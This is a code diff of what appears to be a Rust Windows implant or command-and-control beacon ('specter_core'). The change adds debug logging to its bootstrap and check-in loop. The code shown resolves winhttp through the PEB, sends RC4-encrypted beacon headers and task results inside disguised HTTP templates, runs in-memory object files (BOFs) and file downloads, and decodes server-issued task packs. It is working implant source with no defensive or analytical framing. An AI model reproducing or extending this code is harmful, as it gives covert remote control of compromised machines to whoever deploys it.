@@ -307,7 +307,7 @@ unsafe fn bootstrap() -> Option<Instance> {
 
     let wh = winhttp::resolve(peb, kernel32);
     crate::runtime::debug::log_handle(dbg, b"bs: winhttp ok\n");
-    let sysinfo = crate::runtime::sysinfo::collect(peb);
+    let sysinfo = crate::runtime::sysinfo::collect(peb, dbg);
 
     // Session identity (the beat's SessionKey field and the routing id):
     // generated per run, stable for the whole session.
@@ -484,7 +484,10 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         &mut header_val,
     ) {
         Some(len) => len,
-        None => return,
+        None => {
+            crate::runtime::debug::log(instance, b"ci: fail beat\n");
+            return;
+        }
     };
 
     // Header lines: the beat (listener `hb_header`) + profile headers.
@@ -495,6 +498,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         || !push_bytes(&mut headers, &mut hl, &header_val[..header_len])
         || !push_bytes(&mut headers, &mut hl, b"\r\n")
     {
+        crate::runtime::debug::log(instance, b"ci: fail beat header\n");
         return;
     }
     let mut hi = 0;
@@ -502,6 +506,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         if !push_bytes(&mut headers, &mut hl, config::post_header(hi).as_bytes())
             || !push_bytes(&mut headers, &mut hl, b"\r\n")
         {
+            crate::runtime::debug::log(instance, b"ci: fail headers\n");
             return;
         }
         hi += 1;
@@ -516,18 +521,23 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     if !transport::begin_results(&mut w)
         || (instance.results_len > 0 && !w.push(&instance.results[..instance.results_len]))
     {
+        crate::runtime::debug::log(instance, b"ci: fail results\n");
         return;
     }
     let mut chunk: [u8; 64 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     crate::tasks::download_tick(instance, &mut w, &mut chunk);
     crate::coff::bof_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
+        crate::runtime::debug::log(instance, b"ci: fail results\n");
         return;
     }
     let mut body: [u8; 0x12005] = core::mem::MaybeUninit::uninit().assume_init();
     let body_len = match transport::wrap_results_frame(w.written_bytes(), &mut body) {
         Some(n) => n,
-        None => return,
+        None => {
+            crate::runtime::debug::log(instance, b"ci: fail frame\n");
+            return;
+        }
     };
     Rc4::new(&instance.session_key).crypt_in_place(&mut body[..body_len]);
 
@@ -549,8 +559,12 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     let mut resp: [u8; 0x10000] = core::mem::MaybeUninit::uninit().assume_init();
     let resp_len = match winhttp::post(&wh, &request, &mut resp) {
         Some(len) => len,
-        None => return,
+        None => {
+            crate::runtime::debug::log(instance, b"ci: fail post\n");
+            return;
+        }
     };
+    crate::runtime::debug::log(instance, b"ci: posted\n");
 
     // Response page: template payload, session-decrypted in place.
     let (start, end) = match transport::extract_payload_range(
@@ -559,10 +573,19 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         config::POST_SERVER_OUTPUT_APPEND.as_bytes(),
     ) {
         Some(range) => range,
-        None => return,
+        None => {
+            crate::runtime::debug::log(instance, b"ci: fail range\n");
+            return;
+        }
     };
     if end > start {
         Rc4::new(&instance.session_key).crypt_in_place(&mut resp[start..end]);
+    } else {
+        // Empty payload = zero hosted tasks: the server writes nothing at
+        // all between the prepend and append (no size header), which is a
+        // successful check-in with an empty task pack.
+        crate::runtime::debug::log(instance, b"check-in: ok\n");
+        return;
     }
 
     // Task pack: u32 LE total size, then [data || u32 LE taskId] records.
@@ -572,7 +595,10 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     let mut head = specter_core::wire::Reader::new(&resp[start..end]);
     let pack = match head.u32_le().and_then(|total| head.take(total as usize)) {
         Some(pack) => pack,
-        None => return,
+        None => {
+            crate::runtime::debug::log(instance, b"ci: fail pack\n");
+            return;
+        }
     };
     let mut r = specter_core::wire::Reader::new(pack);
 
